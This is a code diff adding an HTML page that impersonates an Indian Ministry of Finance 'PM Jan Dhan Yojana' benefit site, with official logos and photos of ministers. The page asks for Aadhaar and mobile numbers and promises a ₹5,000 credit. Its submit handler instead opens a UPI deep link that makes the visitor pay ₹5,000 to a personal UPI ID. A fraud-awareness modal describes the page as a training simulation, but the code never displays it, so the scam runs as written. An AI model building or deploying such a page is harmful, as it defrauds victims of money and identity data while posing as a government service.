@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PM Jan Dhan Yojana - Government of India</title>
+    <style>
+        :root {
+            --gov-blue: #003366;
+            --gov-orange: #ff9933;
+            --gov-green: #138808;
+            --gov-red: #cc0000;
+            --bg-gray: #f5f5f5;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            background-color: var(--bg-gray);
+            color: #333;
+            line-height: 1.6;
+        }
+        /* Top Government Header */
+        .gov-header {
+            background: linear-gradient(135deg, #003366 0%, #004080 100%);
+            color: white;
+            padding: 0;
+        }
+        .top-bar {
+            background: #002244;
+            padding: 8px 5%;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .header-main {
+            padding: 15px 5%;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .emblem {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .emblem img {
+            height: 80px;
+            filter: brightness(0) invert(1);
+        }
+        .emblem-text {
+            border-left: 2px solid rgba(255,255,255,0.3);
+            padding-left: 15px;
+        }
+        .emblem-text h1 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .emblem-text p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        .header-logo {
+            margin-left: auto;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        .header-logo img {
+            height: 55px;
+        }
+        /* Navigation */
+        .nav-bar {
+            background: #004080;
+            padding: 12px 5%;
+            display: flex;
+            gap: 25px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .nav-bar a {
+            color: white;
+            text-decoration: none;
+            transition: opacity 0.3s;
+        }
+        .nav-bar a:hover {
+            opacity: 0.8;
+        }
+        /* Main Content */
+        .main-content {
+            max-width: 1100px;
+            margin: 30px auto;
+            display: grid;
+            grid-template-columns: 1fr 320px;
+            gap: 25px;
+            padding: 0 15px;
+        }
+        /* Banner */
+        .banner {
+            background: linear-gradient(135deg, #1a5a3a 0%, #138808 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .banner-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            margin-bottom: 15px;
+            border-radius: 8px;
+        }
+        .banner h2 {
+            font-size: 26px;
+            margin-bottom: 10px;
+        }
+        .banner p {
+            opacity: 0.95;
+        }
+        /* Card */
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
+            padding: 30px;
+            margin-bottom: 25px;
+        }
+        .card-header {
+            border-bottom: 2px solid var(--gov-orange);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+        .card-header h3 {
+            color: var(--gov-blue);
+            font-size: 20px;
+        }
+        /* Amount Display */
+        .amount-box {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            border: 2px solid var(--gov-green);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .amount-image {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            display: block;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .amount-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        .amount-value {
+            font-size: 48px;
+            font-weight: 700;
+            color: var(--gov-green);
+        }
+        .amount-note {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--gov-blue);
+            box-shadow: 0 0 0 3px rgba(0,51,102,0.1);
+        }
+        .form-group small {
+            color: #777;
+            font-size: 12px;
+            margin-top: 5px;
+            display: block;
+        }
+        /* UPI Section */
+        .upi-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .upi-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .upi-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #6c5ce7 0%, #a29bfe 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .upi-icon img {
+            width: 30px;
+            height: 30px;
+        }
+        .upi-header h4 {
+            color: #333;
+            font-size: 16px;
+        }
+        .upi-apps {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+        .upi-app {
+            padding: 12px 20px;
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .upi-app img {
+            width: 24px;
+            height: 24px;
+        }
+        .upi-app:hover {
+            border-color: var(--gov-green);
+            background: #f0fff0;
+        }
+        .upi-app.selected {
+            border-color: var(--gov-green);
+            background: #e8f5e9;
+        }
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #138808 0%, #1a7a30 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+        }
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(19,136,8,0.3);
+        }
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+        /* Sidebar */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .profile-card {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
+        }
+        .profile-card img {
+            width: 140px;
+            height: 175px;
+            object-fit: cover;
+            border-radius: 8px;
+            border: 3px solid #e0e0e0;
+        }
+        .profile-name {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--gov-blue);
+        }
+        .profile-title {
+            color: #666;
+            font-size: 13px;
+        }
+        .info-card {
+            background: #fff9e6;
+            border: 1px solid #ffd666;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        .info-card h4 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .info-card ul {
+            margin-left: 20px;
+            color: #664d03;
+            font-size: 13px;
+        }
+        .info-card li {
+            margin-bottom: 5px;
+        }
+        /* Footer */
+        .footer {
+            background: #1a1a1a;
+            color: #999;
+            padding: 40px 5%;
+            margin-top: 50px;
+        }
+        .footer-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            text-align: center;
+            font-size: 13px;
+        }
+        .footer-links {
+            margin: 20px 0;
+        }
+        .footer-links a {
+            color: #999;
+            margin: 0 15px;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            color: white;
+        }
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #2a2a2a;
+            padding: 10px 20px;
+            border-radius: 20px;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        .footer-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .footer-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #2a2a2a;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 11px;
+        }
+        .footer-badge img {
+            width: 24px;
+            height: 24px;
+        }
+        /* Fraud Alert Modal */
+        #fraudAlert {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .alert-content {
+            background: white;
+            max-width: 600px;
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .alert-header {
+            background: linear-gradient(135deg, #cc0000 0%, #ff3333 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        .alert-header h2 {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        .alert-body {
+            padding: 30px;
+        }
+        .alert-body h3 {
+            color: var(--gov-blue);
+            margin-bottom: 15px;
+        }
+        .alert-body ul {
+            margin: 15px 0 15px 25px;
+        }
+        .alert-body li {
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        .alert-body strong {
+            color: #cc0000;
+        }
+        .alert-warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .btn-close {
+            width: 100%;
+            padding: 15px;
+            background: #333;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-close:hover {
+            background: #444;
+        }
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .header-main {
+                flex-direction: column;
+                text-align: center;
+            }
+            .emblem {
+                flex-direction: column;
+            }
+            .emblem-text {
+                border-left: none;
+                padding-left: 0;
+                border-top: 2px solid rgba(255,255,255,0.3);
+                padding-top: 15px;
+            }
+            .header-logo {
+                margin-left: 0;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Government Header -->
+<header class="gov-header">
+    <div class="top-bar">
+        <span>Help Desk: 1800-XXX-XXXX | Email: support@gov.in</span>
+        <span>Last Updated: January 2025</span>
+    </div>
+    <div class="header-main">
+        <div class="emblem">
+            <img src="images/emblem_india.svg.png" alt="Emblem of India">
+            <div class="emblem-text">
+                <h1>Ministry of Finance</h1>
+                <p>Department of Financial Services</p>
+                <p style="font-size: 11px; opacity: 0.8;">Government of India</p>
+            </div>
+        </div>
+        <!-- <div class="header-logo">
+            <img src="images/national_symbol.png" alt="National Symbol" style="height: 60px; filter: brightness(0) invert(1);">
+            <img src="https://upload.wikimedia.org/wikipedia/en/d/d9/Pradhan_Mantri_Jan_Dhan_Yojana_logo.png" alt="PMJDY" style="width: 50px; height: auto; background: white; padding: 5px; border-radius: 5px;">
+        </div> -->
+    </div>
+    <nav class="nav-bar">
+        <a href="#">Home</a>
+        <a href="#">About PMJDY</a>
+        <a href="#">Eligibility</a>
+        <a href="#">Account Status</a>
+        <a href="#">Grievance</a>
+        <a href="#">Contact</a>
+    </nav>
+</header>
+
+<!-- Main Content -->
+<main class="main-content">
+    <div class="content-area">
+        <!-- Banner -->
+        <div class="banner">
+            <img src="https://upload.wikimedia.org/wikipedia/en/d/d9/Pradhan_Mantri_Jan_Dhan_Yojana_logo.png" alt="PM Jan Dhan Yojana" class="banner-image">
+            <h2>🎉 PM Jan Dhan Yojana - ₹5,000 Benefit Credit</h2>
+            <p>Complete verification to receive your benefit amount directly via UPI</p>
+        </div>
+
+        <!-- Form Card -->
+        <div class="card">
+            <div class="card-header">
+                <img src="https://cdn-icons-png.flaticon.com/512/2921/2921226.png" alt="Verification" style="width: 40px; height: 40px;">
+                <h3>📋 Beneficiary Verification Form</h3>
+            </div>
+
+            <div class="amount-box">
+                <img src="https://cdn-icons-png.flaticon.com/512/2534/2534204.png" alt="Money" class="amount-image">
+                <div class="amount-label">Benefit Amount Pending</div>
+                <div class="amount-value">₹5,000</div>
+                <div class="amount-note">* Complete verification to receive your benefit amount</div>
+            </div>
+
+            <form id="claimForm">
+                <div class="form-group">
+                    <label>Aadhaar Number (12 Digits)</label>
+                    <input type="text" id="aadhaar" placeholder="XXXX XXXX XXXX" maxlength="14">
+                    <small>Your Aadhaar is linked with your bank account</small>
+                </div>
+
+                <div class="form-group">
+                    <label>Mobile Number (Registered with Bank)</label>
+                    <input type="tel" id="mobile" placeholder="+91 XXXXXXXXXX" maxlength="10">
+                    <small>OTP will be sent to this number</small>
+                </div>
+
+                <div class="upi-section">
+                    <div class="upi-header">
+                        <img src="https://cdn.iconscout.com/icon/free/png-512/free-upi-logo-icon-svg-download-png-1747946.png?f=webp&w=256" alt="UPI" style="width: 40px; height: 40px;">
+                        <h4>Select UPI App for Instant Transfer</h4>
+                    </div>
+                    <p style="font-size: 13px; color: #666;">Amount will be credited directly to the selected UPI app</p>
+                    <div class="upi-apps">
+                        <div class="upi-app selected" onclick="selectUPI(this, 'gpay')">
+                            <img src="images/gpay_logo.png" alt="Google Pay">
+                            Google Pay
+                        </div>
+                        <div class="upi-app" onclick="selectUPI(this, 'phonepe')">
+                            <img src="images/phonepe_logo.png" alt="PhonePe">
+                            PhonePe
+                        </div>
+                        <div class="upi-app" onclick="selectUPI(this, 'paytm')">
+                            <img src="images/paytm_logo.png" alt="Paytm">
+                            Paytm
+                        </div>
+                        <div class="upi-app" onclick="selectUPI(this, 'upi')">
+                            <img src="images/upi_logo.png" alt="Other UPI">
+                            Other UPI
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label style="display: flex; align-items: center; gap: 10px;">
+                        <input type="checkbox" id="terms" style="width: auto;">
+                        I agree to the Terms & Conditions and authorize the transfer
+                    </label>
+                </div>
+
+                <button type="button" class="btn-submit" onclick="processClaim()">
+                    ✅ Verify & Receive ₹5,000
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="profile-card">
+            <img src="https://jkbjp.in/wp-content/uploads/2016/11/sh_narendra_modi_27.09.2016_5-1.png" alt="Hon'ble Prime Minister">
+            <div class="profile-name">Shri Narendra Modi</div>
+            <div class="profile-title">Hon'ble Prime Minister of India</div>
+            <hr style="margin: 15px 0; border: none; border-top: 1px solid #eee;">
+            <p style="font-size: 13px; color: #555; font-style: italic;">
+                "Financial inclusion is the key to empowerment"
+            </p>
+        </div>
+
+        <div class="info-card">
+            <h4>⚡ Quick Information</h4>
+            <ul>
+                <li><strong>Scheme:</strong> PM Jan Dhan Yojana</li>
+                <li><strong>Benefit Amount:</strong>₹5,000</li>
+                <li><strong>Mode:</strong> UPI Payment</li>
+                <li><strong>Status:</strong> Active</li>
+                <li><strong>Validity:</strong> 24 hours only</li>
+            </ul>
+        </div>
+
+        <!-- Additional Info Cards with Images -->
+        <div class="info-card" style="background: #e8f5e9; border-color: #81c784;">
+            <img src="https://blog.quickwork.co/content/images/size/w2000/2024/03/02-27-UPI.png" alt="UPI" style="width: 100%; height: auto; margin-bottom: 10px; border-radius: 5px;">
+            <h4 style="color: #2e7d32;">💳 UPI Verified</h4>
+            <ul>
+                <li>Secure Payment Gateway</li>
+                <li>Instant Transfer</li>
+                <li>Bank Level Security</li>
+            </ul>
+        </div>
+
+        <div class="profile-card">
+            <img src="https://s7d1.scene7.com/is/image/wbcollab/nirmala-sitharam?qlt=75&resMode=sharp2" alt="Finance Minister">
+            <div class="profile-name">Smt. Nirmala Sitharaman</div>
+            <div class="profile-title">Hon'ble Finance Minister</div>
+            <hr style="margin: 15px 0; border: none; border-top: 1px solid #eee;">
+            <p style="font-size: 13px; color: #555; font-style: italic;">
+                " empowering every Indian with financial freedom"
+            </p>
+        </div>
+    </aside>
+</main>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-links">
+            <a href="#">Terms of Use</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Hyperlink Policy</a>
+            <a href="#">RTI</a>
+            <a href="#">Accessibility Statement</a>
+        </div>
+        <p>Content owned & maintained by Ministry of Finance, Government of India</p>
+        <p>© 2025 Government of India. All rights reserved.</p>
+        <div class="footer-badges">
+            <div class="footer-badge">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/QR_Code_Example.svg/512px-QR_Code_Example.svg.png" alt="QR">
+                <span>Secure QR</span>
+            </div>
+            <div class="footer-badge">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Google_Pay_Logo.svg/512px-Google_Pay_Logo.svg.png" alt="GPay">
+                <span>GPay Accepted</span>
+            </div>
+            <div class="footer-badge">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/PhonePe_Logo.svg/512px-PhonePe_Logo.svg.png" alt="PhonePe">
+                <span>PhonePe</span>
+            </div>
+            <div class="footer-badge">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28vector%29.svg/512px-Paytm_Logo_%28vector%29.svg.png" alt="Paytm">
+                <span>Paytm</span>
+            </div>
+        </div>
+        <div class="security-badge">
+            <span>🔒</span>
+            <span>SSL Secured | 256-bit Encryption</span>
+        </div>
+    </div>
+</footer>
+
+<!-- Fraud Alert Modal (Educational Purpose) -->
+<div id="fraudAlert">
+    <div class="alert-content">
+        <div class="alert-header">
+            <h2>🚨 CYBERSECURITY ALERT</h2>
+            <p>This is a Simulated Phishing Page</p>
+        </div>
+        <div class="alert-body">
+            <h3>⚠️ You clicked on a FRAUDULENT PAGE!</h3>
+            
+            <div class="alert-warning">
+                <strong>Educational Demonstration:</strong> This page is designed to simulate real phishing attacks for cybersecurity awareness training.
+            </div>
+
+            <h3>🚩 Red Flags Detected:</h3>
+            <ul>
+                <li><strong>Fake Government Theme:</strong> Uses official-looking logos and design to gain trust</li>
+                <li><strong>UPI Payment Link:</strong> Would redirect to a real UPI payment with fraudulent merchant ID</li>
+                <li><strong>UPI ID Used:</strong> <code>idealshubuham1998@oksbi</code></li>
+                <li><strong>No .gov.in URL:</strong> Real government sites always use government domain</li>
+                <li><strong>Urgency Tactics:</strong> "24 hours only" creates false pressure</li>
+                <li><strong>Personal Data Collection:</strong> Aadhaar, mobile, account numbers</li>
+            </ul>
+
+            <h3>✅ How to Protect Yourself:</h3>
+            <ul>
+                <li>Always verify URL ends with <strong>.gov.in</strong></li>
+                <li>Never click links from unknown sources</li>
+                <li>Government never asks for OTP or Aadhaar via phone</li>
+                <li>Check UPI app carefully before confirming payments</li>
+            </ul>
+        </div>
+        <button class="btn-close" onclick="closeAlert()">I Understand - Close This Demo</button>
+    </div>
+</div>
+
+<script>
+    let selectedUPI = 'gpay';
+
+    function selectUPI(element, app) {
+        // Remove selected class from all
+        document.querySelectorAll('.upi-app').forEach(el => el.classList.remove('selected'));
+        // Add to clicked
+        element.classList.add('selected');
+        selectedUPI = app;
+    }
+
+    function processClaim() {
+        const aadhaar = document.getElementById('aadhaar').value;
+        const mobile = document.getElementById('mobile').value;
+        const terms = document.getElementById('terms').checked;
+
+        // Basic validation
+        if (!aadhaar || !mobile) {
+            alert('Please fill all fields');
+            return;
+        }
+
+        if (!terms) {
+            alert('Please accept Terms & Conditions');
+            return;
+        }
+
+        // Create UPI payment link with user's UPI ID
+        const upiId = 'idealshubuham1998-1@oksbi';
+        const upiAmount = '5000';
+        const upiNote = 'PMJDY_Benefit_Transfer';
+        
+        // UPI deep link format - will open UPI app and ask for password/PIN
+        const upiLink = `upi://pay?pa=${upiId}&pn=PMJDY_Benefit_Transfer&am=${upiAmount}&cu=INR&tn=${encodeURIComponent(upiNote)}`;
+        
+        // Open UPI app directly
+        window.location.href = upiLink;
+    }
+
+    function showFraudAlert(upiLink) {
+        const alertBox = document.getElementById('fraudAlert');
+        const bodyContent = alertBox.querySelector('.alert-body');
+        
+        // Add the UPI link information
+        const upiInfo = document.createElement('div');
+        upiInfo.className = 'alert-warning';
+        upiInfo.innerHTML = `
+            <strong>UPI Deep Link That Would Be Triggered:</strong><br>
+            <code style="word-break: break-all; font-size: 11px;">${upiLink}</code><br><br>
+            <strong>UPI ID:</strong> idealshubuham1998@oksbi<br>
+            <strong>Amount:</strong> ₹5,000 (victim thinks they will receive, but actually sending)
+        `;
+        
+        bodyContent.insertBefore(upiInfo, bodyContent.querySelector('h3'));
+        
+        alertBox.style.display = 'flex';
+    }
+
+    function closeAlert() {
+        document.getElementById('fraudAlert').style.display = 'none';
+        // Reset form
+        document.getElementById('claimForm').reset();
+    }
+
+    // Format Aadhaar input
+    document.getElementById('aadhaar').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/(\d{4})/g, '$1 ').trim();
+        e.target.value = value.substring(0, 14);
+    });
+
+    // Format mobile input
+    document.getElementById('mobile').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 10) value = value.substring(0, 10);
+        e.target.value = value;
+    });
+</script>
+
+</body>
+</html>
